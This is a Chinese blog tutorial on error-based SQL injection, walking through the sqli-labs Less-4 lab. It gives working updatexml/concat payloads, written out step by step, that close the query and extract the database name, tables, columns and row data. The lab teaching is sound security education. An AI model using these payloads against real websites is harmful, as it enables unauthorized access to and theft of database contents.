---
title: 极易上手的报错注入
tags: 
  - SQL注入
  - 报错注入
  - updatexml
  - 靶场演示
categories: web安全
keywords: 'SQL注入,报错注入,易上手,updatexml,靶场演示'
description: 极易上手的报错注入
cover: https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg2018.cnblogs.com%2Fblog%2F1579399%2F201907%2F1579399-20190717003510359-570355042.png&refer=http%3A%2F%2Fimg2018.cnblogs.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630916535&t=757f4c39d3a5884249a1291b70cde3b7
date: 2020-05-01 16:37:02
---

报错注入：报错注入的意思是用户通过执行一些语句让数据库报出了致命性错误，只需要在里面放入sql子查询语句，就可以得到对应的信息。

文章开头，先学习一下中华人民共和国网络安全法：	
https://www.cto.ac.cn/thread-106.htm

![upload successful](/images/pasted-20.png)

![upload successful](/images/pasted-21.png)

![upload successful](/images/pasted-22.png)

## 漏洞简介
在这里先简单介绍一下漏洞之王SQL注入：
SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。
作为OWASP榜首的漏洞，SQL注入一直是网络上占比重最大的漏洞，而要实现这一漏洞，需要有两个关键条件：

1.	用户可以控制输入。
2.	用户输入的数据被当作代码拼接到了数据库语句当中。


## 报错注入具体流程
1.先打开靶场，靶场我选择sqli-labs的less4，这里我顺手传参了id=1
![upload successful](/images/pasted-23.png)

2.每次看到这种id=的get传参的时候，总是喜欢加个'，这次看到，这里没有效果了，页面还是正常的。
![upload successful](/images/pasted-24.png)

3.那现在怎么办呢，单引号不行，那试试双引号吧
```
?id=1"
```
运气不错，页面报错了，这里作为黑盒测试的话，一看到报错了是最开心的，当然一般还要试试 **?id=1')** 和 **?id=1")**
![upload successful](/images/pasted-25.png)

4.这里还是看看源码来分析吧。
![upload successful](/images/pasted-26.png)
这里明显看到，原来id外面先拼接了""	
语句为：
```
$id = '"' . $id . '"';	
$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
```
那对于我们传入的数据来说，放入到数据库里面执行的语句就是：
```
$sql="SELECT * FROM users WHERE id=(" $id") LIMIT 0,1";
```

5.也就是说，在传参的时候，我们传入的数据外面有一层双引号之外，还有一层括号，那么闭合的方法就是将之间的单引号换成双引号加括号 后面再加上#注释（也可以通过--+来注释），可以看到页面返回正常，这里的传参是：
```
?id=1") --+
```
![upload successful](/images/pasted-27.png)

6.这里已经成功闭合了，那么就开始我们的报错注入吧，在")和--+中间放入我事先准备好的数据库报错查询语句，成功查询到数据库库名security，传参为：
```
?id=1") and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+
```
![upload successful](/images/pasted-28.png)

7.既然已经查询到了数据库库名，那么查到数据库里面的数据也就不远了。将报错注入的函数里面的select database()换成查询系统自带库information_schema中的表的语句。
传参为：
```
?id=1") and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) --+
```
![upload successful](/images/pasted-29.png)

8.查询出来一个emails表，感觉没有想要的信息，不想查询它的数据了，更改一下limit 0,1 为limit 1,1 获得另一张表referers。
![upload successful](/images/pasted-30.png)

9.有表名了，那么接下来就是查询referers表中的字段。这里学习一个新的函数，**group_concat()** ，这个函数会将group by产生的同一个分组中的值连接起来，返回一个字符串结果。什么意思呢，就是我们使用这个函数，可以不需要limit 0，1 ， limit 1，1这样轮询得到所有的数据，一个函数搞定。
传参为：
```
?id=1") and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='referers' limit 0,1),0x7e),1) --+
```
得到了这个表中的三个字段为id,referer和ip_address
![upload successful](/images/pasted-31.png)

10.有了表名和字段名，接下来就是查询数据了，通过查询referers表中的referer字段为例，获取数据库信息。传参为: 
```
?id=1") and updatexml(1,concat(0x7e,(select group_concat(referer) from referers),0x7e),1) --+
```

![upload successful](/images/pasted-32.png)
这里就获取了里面我随意插入的3个数据admin1，admin2，admin3

## 总结

这里就是报错注入的整个流程了，报错注入在sql注入中占比还是比较大的，还有很多bypass技巧，大家可以自行学习一下。

